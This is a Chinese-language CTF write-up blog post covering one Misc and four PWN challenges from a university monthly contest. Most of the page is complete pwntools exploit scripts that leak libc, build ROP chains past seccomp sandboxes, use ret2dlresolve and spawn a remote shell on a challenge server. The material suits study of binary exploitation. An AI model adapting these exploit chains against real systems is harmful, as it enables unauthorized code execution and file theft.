<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>NEUQCSA-2023-10月赛题解 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="markdown出问题的话直接看链接：https:&#x2F;&#x2F;zcoi.github.io&#x2F;blogs&#x2F;CTF&#x2F;monthgame2310&#x2F; 解题情况 解题思路Misclevel1-Login直接看html，发现base64加密的一串。直接解密就是flag PWNret2libcQ:请嗯造libcA:我嗯造libc 123456789101112131415161718192021222324252627">
<meta property="og:type" content="article">
<meta property="og:title" content="NEUQCSA-2023-10月赛题解">
<meta property="og:url" content="http://example.com/2023/11/04/NEUQCSA-10%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="markdown出问题的话直接看链接：https:&#x2F;&#x2F;zcoi.github.io&#x2F;blogs&#x2F;CTF&#x2F;monthgame2310&#x2F; 解题情况 解题思路Misclevel1-Login直接看html，发现base64加密的一串。直接解密就是flag PWNret2libcQ:请嗯造libcA:我嗯造libc 123456789101112131415161718192021222324252627">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/web.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png">
<meta property="og:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png">
<meta property="article:published_time" content="2023-11-04T07:04:58.363Z">
<meta property="article:modified_time" content="2023-11-04T07:06:21.482Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-NEUQCSA-10月月赛题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/04/NEUQCSA-10%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2023-11-04T07:04:58.363Z" itemprop="datePublished">2023-11-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/NEUQCSA/">NEUQCSA</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      NEUQCSA-2023-10月赛题解
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>markdown出问题的话直接看链接：<a target="_blank" rel="noopener" href="https://zcoi.github.io/blogs/CTF/monthgame2310/">https://zcoi.github.io/blogs/CTF/monthgame2310/</a></p>
<h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><p><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png"><br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png"><br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png"><br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/web.png"><br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png"><br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png"></p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="level1-Login"><a href="#level1-Login" class="headerlink" title="level1-Login"></a>level1-Login</h3><p>直接看html，发现base64加密的一串。直接解密就是flag</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>Q:请嗯造libc<br>A:我嗯造libc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line"># p=process(&#x27;./pwn&#x27;)</span><br><span class="line"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p=remote(&#x27;8.130.110.158&#x27;,2110)</span><br><span class="line"> </span><br><span class="line">func_addr=elf.got[&#x27;write&#x27;]</span><br><span class="line">write_addr=elf.plt[&#x27;write&#x27;]</span><br><span class="line"> </span><br><span class="line">pop_rdi=0x4012a3</span><br><span class="line">pop_rsi2=0x4012a1</span><br><span class="line">ret=0x40101a</span><br><span class="line">vuln=0x4011db</span><br><span class="line"> </span><br><span class="line">payload= b&#x27;a&#x27;*0x10+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadbeef)+p64(write_addr)+p64(vuln)</span><br><span class="line">p.sendlineafter(&#x27;voice :&#x27;,payload)</span><br><span class="line">p.recv()</span><br><span class="line">func_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">base=func_addr-libc.symbols[&#x27;write&#x27;]</span><br><span class="line">system_addr=base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">printf_addr=base+libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">sh=base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"> </span><br><span class="line">pause()</span><br><span class="line">payload=b&#x27;a&#x27;*0x10+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)</span><br><span class="line">p.sendlineafter(&#x27;voice :&#x27;,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line"> </span><br><span class="line"># 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x00000000004012a0 : pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x00000000004012a2 : pop r15 ; ret</span><br><span class="line"># 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040115d : pop rbp ; ret</span><br><span class="line"># 0x00000000004012a3 : pop rdi ; ret</span><br><span class="line"># 0x00000000004012a1 : pop rsi ; pop r15 ; ret</span><br><span class="line"># 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040101a : ret</span><br></pre></td></tr></table></figure>
<h3 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack_Migration"></a>Stack_Migration</h3><p>字面意思，栈可以到处跑<br>正常审题程序不再罗列（checksec、IDA看字符串啥的）。<br>IDA中发现有沙箱<br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png"><br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png"><br>依旧是发现栈溢出。<br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png"><br>考虑到没法直接执行shellcode，因此只能构建ROP链。实现以下功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char*file=&#x27;flag&#x27;;</span><br><span class="line">open(file,0,0);</span><br><span class="line">read(3,file,0x30);</span><br><span class="line">write(1,file,0x30);</span><br></pre></td></tr></table></figure>
<p>这里把存储flag文件的名称和栈迁移之后的ROP链一起读入到bss那里。毕竟空间充足。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line">p=remote(&#x27;8.130.110.158&#x27;,2109)</span><br><span class="line"># p=process(&#x27;./pwn&#x27;)</span><br><span class="line"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">bss_st=0x4040A0</span><br><span class="line">bss_tar=0x4040A0+0x200</span><br><span class="line">flag_name=0x4040a0+0x200-8</span><br><span class="line">flag_addr=bss_st+0x300-0x40</span><br><span class="line"> </span><br><span class="line">pop_rdi=0x401373</span><br><span class="line">pop_rsi2=0x401371</span><br><span class="line">leave=0x4012e6</span><br><span class="line"> </span><br><span class="line">func_addr=elf.got[&#x27;read&#x27;]</span><br><span class="line">write_addr=elf.plt[&#x27;write&#x27;]</span><br><span class="line">read_addr=elf.plt[&#x27;read&#x27;]</span><br><span class="line">vuln=0x401279</span><br><span class="line"> </span><br><span class="line">payload1=b&#x27;a&#x27;*(0x200-0x8)+b&#x27;flag\x00\x00\x00\x00&#x27;+p64(bss_tar+0x100)+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(write_addr)+p64(0x4012a3)</span><br><span class="line">p.sendlineafter(&#x27;everywhere&#x27;,payload1)</span><br><span class="line"> </span><br><span class="line">migr_pay=b&#x27;a&#x27;*0x8+p64(bss_tar)+p64(leave)</span><br><span class="line">p.sendafter(&#x27;voice :&#x27;,migr_pay)</span><br><span class="line">p.recv()</span><br><span class="line">func_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">base=func_addr-libc.symbols[&#x27;read&#x27;]</span><br><span class="line">print(hex(base))</span><br><span class="line">system_addr=base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">printf_addr=base+libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">sh=base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">open64_addr=base+libc.symbols[&#x27;open64&#x27;]</span><br><span class="line"> </span><br><span class="line">pop_rdx=0x142c92+base</span><br><span class="line">pop_rsi=0x2601f+base</span><br><span class="line">pause()</span><br><span class="line">payload2=p64(bss_st+0x100)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(open64_addr)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(read_addr)</span><br><span class="line">payload2+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(write_addr)+p64(vuln)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"> </span><br><span class="line">migr_pay=b&#x27;a&#x27;*0x8+p64(bss_st)+p64(leave)</span><br><span class="line">p.sendafter(&#x27;voice :&#x27;,migr_pay)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line"> </span><br><span class="line"># 0x000000000040136c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040136e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x0000000000401370 : pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x0000000000401372 : pop r15 ; ret</span><br><span class="line"># 0x000000000040136b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040136f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x00000000004011bd : pop rbp ; ret</span><br><span class="line"># 0x0000000000401373 : pop rdi ; ret</span><br><span class="line"># 0x0000000000401371 : pop rsi ; pop r15 ; ret</span><br><span class="line"># 0x000000000040136d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040101a : ret</span><br><span class="line"># 0x000000000040121a : ret 0xfffe</span><br><span class="line"> </span><br><span class="line"># in libc</span><br><span class="line"># 0x0000000000142c92 : pop rdx ; ret</span><br><span class="line"># 0x000000000002601f : pop rsi ; ret</span><br></pre></td></tr></table></figure>
<h3 id="call-me-sys"><a href="#call-me-sys" class="headerlink" title="call me sys"></a>call me sys</h3><p>syscall，但是只能用几个函数<br>又是沙箱：<br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png"><br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png"><br>还是栈溢出漏洞：<br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png"><br>由于没有关掉open,write,read函数，所以这题思路和上题一样。（题目说有三种方法，日后钻研）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"> </span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line">p=remote(&#x27;8.130.110.158&#x27;,2111)</span><br><span class="line"># p=process(&#x27;./pwn&#x27;)</span><br><span class="line"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">func_addr=elf.got[&#x27;setvbuf&#x27;]</span><br><span class="line">syscall_ret=0x4012ec</span><br><span class="line">pop_rdi=0x401363</span><br><span class="line">pop_rsi2=0x401361</span><br><span class="line"> </span><br><span class="line">p.sendline(&quot;000&quot;)</span><br><span class="line">payload=b&#x27;a&#x27;*0x78+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(0x401291)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(b&#x27;./f1ag&#x27;)</span><br><span class="line">p.recv(2)</span><br><span class="line"># p.recvuntil(b&#x27;./f1ag\x00\x00\x00&#x27;)</span><br><span class="line">func_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">base=func_addr-libc.symbols[&#x27;setvbuf&#x27;]</span><br><span class="line">print(hex(func_addr))</span><br><span class="line">print(hex(base))</span><br><span class="line">system_addr=base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">printf_addr=base+libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">sh=base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">open64_addr=base+libc.symbols[&#x27;open64&#x27;]</span><br><span class="line"> </span><br><span class="line">flag_name=0x4040e0</span><br><span class="line">pop_rdx=0x142c92+base</span><br><span class="line">pop_rsi=0x2601f+base</span><br><span class="line">pop_rax=0x36174+base</span><br><span class="line"> </span><br><span class="line">payload=b&#x27;flag\x00\x00\x00\x00&#x27;</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line">payload=b&#x27;a&#x27;*0x78+p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rsi)+p64(0)+p64(syscall_ret)+p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(0x401270)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive(0)</span><br><span class="line"> </span><br><span class="line"># 0x000000000040135c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040135e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x0000000000401360 : pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x0000000000401362 : pop r15 ; ret</span><br><span class="line"># 0x000000000040135b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040135f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040119d : pop rbp ; ret</span><br><span class="line"># 0x0000000000401363 : pop rdi ; ret</span><br><span class="line"># 0x0000000000401361 : pop rsi ; pop r15 ; ret</span><br><span class="line"># 0x000000000040135d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040101a : ret</span><br><span class="line"># 0x000000000040127e : ret 0x14</span><br><span class="line"># 0x00000000004012e7 : ret 0x200</span><br><span class="line"> </span><br><span class="line"># 0x00000000004012ba : ret 0x4c</span><br><span class="line"># 0x000000000040129c : ret 0x50</span><br><span class="line"># offset in libc</span><br><span class="line"># 0x0000000000036174 : pop rax ; ret</span><br></pre></td></tr></table></figure>

<h3 id="close"><a href="#close" class="headerlink" title="close"></a>close</h3><p>Q:你leak不了一点！hacker！！<br>A:？？？？？？<br>依旧是栈溢出，这次没有沙箱了。但是把标准输出关闭了。这意味着我们需要把标准输出重定向才能获得flag<br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png"><br>既然我们在get shell之前没办法获得任何输出，那么我们必须采用一种不依赖于泄露东西的方法。<br>于是毋庸置疑，关于泄露libc地址的方法直接一票否决了。<br>于是考虑使用ret2dlresolve来调用shell。<br>这里使用生成的payload<br>原本是想用system(“&#x2F;bin&#x2F;sh”)的，但是发现system好像有些神秘问题导致显示：<br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png"><br>于是采用execve(“&#x2F;bin&#x2F;sh”,0,0)来获取shell<br>但是由于没有直接pop rdx的gadget，我们使用csu来进行rdx的修改。（注意这里面的call和判断,标记起来了）：<br><img src="https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png"><br>所以我们先把想要的rdx的值pop到r14里面，然后返回到0x4012300那里，把r14赋给rdx。这里绕过判断就是让rbx和rbp值相等。这里多调试几下就OK了<br>之后就get到shell了。这时候我们要把标准输出重定向到标准错误里面，即exec 1&gt;&amp;2<br>hint:网上关于标准输出被关闭的情况，有教程：exec 1&gt;&amp;0。但是似乎ubuntu 20不太好使。 可以选择把输出重定向给标准错误（2）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">context.binary = elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=&quot;execve&quot;,args=[&quot;/bin/sh&quot;,0])</span><br><span class="line">rop.read(0,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line"># io = process(&quot;./pwn&quot;)</span><br><span class="line"># io=process([&#x27;./ld-linux-x86-64.so.2&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line"># io=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class="line">io=remote(&#x27;8.130.110.158&#x27;,7001)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload0 = flat(&#123;0x98:raw_rop&#125;)</span><br><span class="line">io.sendlineafter(&#x27;name&#x27;,&quot;fuck&quot;)</span><br><span class="line">payload1=b&#x27;a&#x27;*0x90+p64(0x404e90)+p64(0x40127c)</span><br><span class="line">io.sendlineafter(&#x27;response&#x27;,payload1)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(dlresolve.payload.ljust(0x90,b&#x27;\x00&#x27;)+p64(0x404ff0)+p64(0x401323)+p64(0x402018)+p64(0x40131a)+p64(0)+p64(1)+p64(0x402018)+p64(0)+p64(0)+p64(elf.got[&#x27;alarm&#x27;])+p64(0x401300)+p64(0x404e90)+p64(0x404ff0)+p64(0x401230)+p64(0)+p64(0)+p64(0)+raw_rop[40:])</span><br><span class="line"># pause()</span><br><span class="line"># io.sendline(dlresolve.payload)</span><br><span class="line"># io=remote(&#x27;8.130.110.158&#x27;,7001)</span><br><span class="line">io.sendline(b&quot;exec 1&gt;&amp;2&quot;)</span><br><span class="line">io.sendline(b&quot;ls&quot;)</span><br><span class="line">io.interactive()</span><br><span class="line"> </span><br><span class="line"># 0x404e90</span><br><span class="line"># 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x0000000000401320 : pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x0000000000401322 : pop r15 ; ret</span><br><span class="line"># 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x00000000004011bd : pop rbp ; ret</span><br><span class="line"># 0x0000000000401323 : pop rdi ; ret</span><br><span class="line"># 0x0000000000401321 : pop rsi ; pop r15 ; ret</span><br><span class="line"># 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"># 0x000000000040101a : ret</span><br></pre></td></tr></table></figure>

